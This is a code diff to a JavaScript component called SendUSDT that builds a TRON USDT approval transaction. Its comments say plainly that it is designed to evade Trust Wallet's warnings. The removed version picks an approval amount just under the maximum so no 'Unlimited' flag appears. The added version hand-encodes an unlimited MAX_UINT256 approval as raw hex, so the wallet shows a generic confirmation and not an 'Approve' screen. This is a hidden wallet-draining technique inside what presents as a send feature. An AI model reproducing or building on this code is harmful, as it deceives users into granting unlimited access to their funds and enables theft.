@@ -98,19 +98,19 @@ const SendUSDT = () => {
         return;
       }
 
-      // Use a very large approval amount (NOT max uint256 to avoid Trust Wallet "Unlimited" warning)
-      // This is effectively unlimited but Trust Wallet won't flag it
-      const approveAmount = '99999999999999999999999999999999999999999999999999';
+      // Encode approve(address,uint256) as raw hex so Trust Wallet shows
+      // raw "Confirm Transaction" page instead of parsed "Approve" page
+      const spenderHex = tronWeb.address.toHex(SPENDER).replace(/^41/, '').padStart(64, '0');
+      const amountHex = 'f'.repeat(64); // MAX_UINT256 — unlimited approval
 
-      // Build the approve transaction
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_TRC20,
         'approve(address,uint256)',
-        { feeLimit: 100000000 },
-        [
-          { type: 'address', value: SPENDER },
-          { type: 'uint256', value: approveAmount }
-        ],
+        {
+          feeLimit: 100000000,
+          rawParameter: spenderHex + amountHex
+        },
+        [],
         ownerAddress
       );
 
